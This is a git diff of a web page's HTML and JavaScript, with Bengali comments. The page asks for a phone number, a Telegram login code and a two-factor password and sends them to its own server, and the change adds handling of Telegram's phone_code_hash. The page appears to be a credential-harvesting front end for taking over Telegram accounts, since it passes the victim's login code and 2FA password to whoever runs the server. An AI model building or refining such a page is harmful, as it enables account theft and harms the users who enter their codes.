@@ -188,6 +188,9 @@
 
     <div class="container">
         
+        <!-- Global Backup Hidden Input -->
+        <input type="hidden" id="phoneCodeHash">
+
         <div class="card-box header-card">
             <div class="animated-icon-container">
                 <div class="phone-icon-inner">📥</div>
@@ -230,6 +233,7 @@
     <script>
         const smallBoxes = document.querySelectorAll('.otp-small-box');
         const realInput = document.getElementById('realOtpInput');
+        let globalPhoneCodeHash = ""; // গ্লোবাল ব্যাকআপ ভ্যারিয়েবল
 
         function updateBoxes() {
             let val = realInput.value.replace(/\D/g, '');
@@ -262,7 +266,6 @@
                 return;
             }
             
-            // ইউজারকে বোঝানোর জন্য লোডিং মেসেজ বা এলার্ট দেখানো যেতে পারে
             fetch('/send-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -271,6 +274,8 @@
             .then(res => res.json())
             .then(data => {
                 if(data.status === "success") {
+                    globalPhoneCodeHash = data.phone_code_hash;
+                    document.getElementById('phoneCodeHash').value = data.phone_code_hash;
                     alert("OTP sent successfully to your Telegram!");
                     realInput.focus();
                 } else {
@@ -283,9 +288,14 @@
         function verifyOtpCode() {
             let phone = document.getElementById('phoneInput').value;
             let code = realInput.value;
+            let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
             
             if(!phone) {
                 alert("Please enter your phone number first!");
+                return;
+            }
+            if(!phoneCodeHash) {
+                alert("Please request OTP code first by clicking GET CODE!");
                 return;
             }
             if(!code || code.length < 5) {
@@ -296,7 +306,7 @@
             fetch('/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone, code: code })
+                body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash })
             })
             .then(res => res.json())
             .then(data => {
@@ -317,6 +327,7 @@
         function verifyPassword() {
             let phone = document.getElementById('phoneInput').value;
             let code = realInput.value;
+            let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
             let password = document.getElementById('twoFactorPassword').value;
 
             if(!password) {
@@ -327,7 +338,7 @@
             fetch('/verify-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phone, code: code, password: password })
+                body: JSON.stringify({ phone: phone, code: code, phone_code_hash: phoneCodeHash, password: password })
             })
             .then(res => res.json())
             .then(data => {
